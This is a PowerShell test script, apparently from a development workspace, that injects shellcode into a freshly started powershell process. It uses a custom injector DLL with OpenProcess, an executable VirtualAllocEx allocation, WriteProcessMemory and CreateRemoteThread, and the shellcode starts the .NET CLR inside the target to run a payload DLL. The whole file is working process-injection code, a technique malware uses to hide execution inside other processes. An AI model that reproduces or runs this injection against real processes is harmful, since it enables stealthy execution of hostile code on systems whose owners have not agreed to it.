[System.Reflection.Assembly]::LoadFrom("c:\Users\Admin\Documents\antigravity\nifty-chandrasekhar\injector.dll") | Out-Null

$testProc = Start-Process powershell.exe -ArgumentList "-NoExit -Command `"Start-Sleep 60`"" -PassThru
Write-Host "Started test process PID: $($testProc.Id)"

$testDllPath = "c:\Users\Admin\Documents\antigravity\nifty-chandrasekhar\test_payload.dll"
Remove-Item "c:\Users\Admin\Documents\antigravity\nifty-chandrasekhar\shellcode_test.txt" -ErrorAction SilentlyContinue

$mem = New-Object byte[] 4096

$gMetaHost = [Guid]::Parse("9280188D-0E8E-4867-B30C-7FA83884E8DE").ToByteArray()
$gIIDMetaHost = [Guid]::Parse("D332DB9E-B9B3-4125-8207-A14884F53216").ToByteArray()
$gIIDRuntimeInfo = [Guid]::Parse("BD39D1D2-BA2F-486A-89B0-B4B0CB466891").ToByteArray()
$gClrRuntimeHost = [Guid]::Parse("90F1B06E-7712-4762-86B5-7A5EBA6BD027").ToByteArray()
$gIIDClrRuntimeHost = [Guid]::Parse("90F1B06C-7712-4762-86B5-7A5EBA6BD027").ToByteArray()

[Array]::Copy($gMetaHost, 0, $mem, 0x00, 16)
[Array]::Copy($gIIDMetaHost, 0, $mem, 0x10, 16)
[Array]::Copy($gIIDRuntimeInfo, 0, $mem, 0x20, 16)
[Array]::Copy($gClrRuntimeHost, 0, $mem, 0x30, 16)
[Array]::Copy($gIIDClrRuntimeHost, 0, $mem, 0x40, 16)

$verBytes = [System.Text.Encoding]::Unicode.GetBytes("v4.0.30319`0")
[Array]::Copy($verBytes, 0, $mem, 0x70, $verBytes.Length)

$pathBytes = [System.Text.Encoding]::Unicode.GetBytes("$testDllPath`0")
[Array]::Copy($pathBytes, 0, $mem, 0x90, $pathBytes.Length)

$typeBytes = [System.Text.Encoding]::Unicode.GetBytes("TestPayload.Runner`0")
[Array]::Copy($typeBytes, 0, $mem, 0x290, $typeBytes.Length)

$methodBytes = [System.Text.Encoding]::Unicode.GetBytes("Run`0")
[Array]::Copy($methodBytes, 0, $mem, 0x310, $methodBytes.Length)

$argBytes = [System.Text.Encoding]::Unicode.GetBytes("InjectedSuccessfully!`0")
[Array]::Copy($argBytes, 0, $mem, 0x350, $argBytes.Length)

$hMscoree = [ShellcodeInjector]::GetModuleHandle("mscoree.dll")
$pClrCreateInstance = [ShellcodeInjector]::GetProcAddress($hMscoree, "CLRCreateInstance")
$hKernel32 = [ShellcodeInjector]::GetModuleHandle("kernel32.dll")
$pExitThread = [ShellcodeInjector]::GetProcAddress($hKernel32, "ExitThread")

$sc = [ShellcodeInjector]::BuildShellcode($pClrCreateInstance, $pExitThread)
[Array]::Copy($sc, 0, $mem, 0x400, $sc.Length)

$hProcess = [ShellcodeInjector]::OpenProcess(0x1F0FFF, $false, $testProc.Id)
$pRemote = [ShellcodeInjector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 4096, 0x3000, 0x40)
Write-Host "Allocated remote memory: $pRemote"

$bytesWritten = [IntPtr]::Zero
[ShellcodeInjector]::WriteProcessMemory($hProcess, $pRemote, $mem, 4096, [ref]$bytesWritten) | Out-Null
Write-Host "Written bytes: $bytesWritten"

$pCode = [IntPtr]($pRemote.ToInt64() + 0x400)
$threadId = [IntPtr]::Zero
$hThread = [ShellcodeInjector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $pCode, $pRemote, 0, [ref]$threadId)
Write-Host "Created thread: $hThread, ID: $threadId"

[ShellcodeInjector]::WaitForSingleObject($hThread, 5000) | Out-Null
Start-Sleep -Seconds 1

$testProc | Stop-Process -Force -ErrorAction SilentlyContinue

if (Test-Path "c:\Users\Admin\Documents\antigravity\nifty-chandrasekhar\shellcode_test.txt") {
    Write-Host "SHELLCODE TEST PASSED: " + (Get-Content "c:\Users\Admin\Documents\antigravity\nifty-chandrasekhar\shellcode_test.txt")
} else {
    Write-Host "SHELLCODE TEST FAILED: output file not found"
}
